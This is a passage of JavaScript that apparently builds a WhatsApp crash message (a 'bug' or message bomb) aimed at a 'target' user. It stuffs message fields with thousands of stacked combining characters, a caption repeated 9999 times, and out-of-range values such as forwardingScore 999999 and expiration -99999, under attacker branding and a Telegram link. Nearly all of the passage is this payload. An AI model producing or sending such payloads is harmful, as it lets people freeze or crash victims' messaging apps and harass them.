̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤ͅͅͅͅͅ𝗷𝗮͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "mbuh",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: "⩟⬦𪲁 ͢𝐀͠𝐗͜-",
mediaType: "IMAGE",
caption: "@null⩟⬦𪲁 ͢𝐀͠𝐗͜-".repeat(9999)
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "p",
entryPointConversionApp: "p",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "𝗢𝘇𝘇𝘆𝗗𝗲𝘃4𝗬𝗼𝘂〤 ̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "abc",
parentGroupJid: "abc",
trustBannerType: "kk",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Starevxz - \"𝗋34\" 🩸 ⩟⬦𪲁 ͢𝐀͠𝐗͜-",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: true,
containsAutoReply: false,
body: "̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚̕͘̚̚͘͜͜͜͝͠͠͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̛̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅̕͝͠͝͝